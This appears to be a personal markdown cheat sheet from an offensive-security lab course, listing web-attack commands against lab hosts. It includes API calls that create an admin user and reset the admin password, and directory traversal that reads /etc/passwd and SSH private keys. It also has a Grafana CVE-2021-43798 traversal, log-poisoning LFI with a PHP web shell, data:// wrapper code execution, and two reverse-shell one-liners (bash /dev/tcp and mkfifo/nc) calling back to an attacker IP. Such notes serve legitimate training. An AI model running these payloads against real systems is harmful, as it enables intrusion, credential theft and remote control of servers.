# NMAP
fingerprinting
```
nmap -p80 -sV 192.168.241.51
nmap -p80 -sV --script=http-enum 192.168.241.51
```
# GOBUSTER
Directory brute forcing
```
gobuster dir -u 192.168.241.51 -w /usr/share/wordlists/dirb/common.txt -t 5
```
# APIs 
```
gobuster dir -u http://192.168.241.51:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
```
pattern recognition file
```
{GOBUSTER}/v1
{GOBUSTER}/v2
{GOBUSTER}/v3
{GOBUSTER}/v4
{GOBUSTER}/v5
{GOBUSTER}/v1/admin
```
JSON manipulation
```
curl -i http://192.168.241.51:5002/users/v1/login
#json curl with password
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json' http://192.168.241:5002/users/v1/login
# new user as admin
curl -d '{"password":"lab","username":"offsec-admin","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.241:5002/users/v1/login
```
Steal Admin token
```
curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'
```
# XSS 

# Directory traversal
```
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
```
```
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
```
Encoded Chars
```
curl http://192.168.249.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/passwords

curl --path-as-is http://192.168.249.16/cgi-bin/%2F/%2F/%2F/%2F/%2F/%2F/opt/install.txt

curl --path-as-is http://192.168.249.16:3000/public/plugins/alertlist/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/install.txt

```


## use their ssh key
```
vim dt_key
chmod 400 dt_key
ssh -i dt_key -p 2222 offsec@mountaindesserts.com

```
## CVE-2021-43798
```
curl --path-as-is http://192.168.249.193:3000/public/plugins/alertlist/../../../../../../../../Users/install.txt

```

# LFI 
Check First
```
curl http://192.168.241.X/meteor/index.php?page=../../../../../../var/log/apache2/access.log
```
Inject into burp as user agent string in php
```
<?php echo system($_GET['cmd']); ?>
```
inject into GET
```
/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ls%20-la

# Rev Shell 8080
GET /meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.212%2F8080%200%3E%261%22
# Windows type file
GET /meteor/index.php?page=../../../../../../../xampp/apache/logs/access.log&cmd=type%20hopefullynobodyfindsthisfilebecauseitssupersecret.txt
# execute php file
GET /meteor/index.php?page=../../../../../../opt/admin.bak.php

```
### apache 2.4.49 RCE
```
/50383.sh targets.txt /bin/sh "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.212 8080 >/tmp/f"
```


# PHP Wrappers
no encoding
```
curl http://192.168.187.16/meteor/index.php?page=php://filter/resource=/var/www/html/backup.php
```
Encoding
```
curl http://192.168.187.16/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php
```
Command
```
curl "http://192.168.187.16/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"

```
encode our command
```
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==

curl "http://192.168.187.16/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=uname%20-a%0A"
```

# RFI 

# File Upload

# Command Injection


# Checklist
get application/version 
robots.txt
sitemap.xml
dirb 

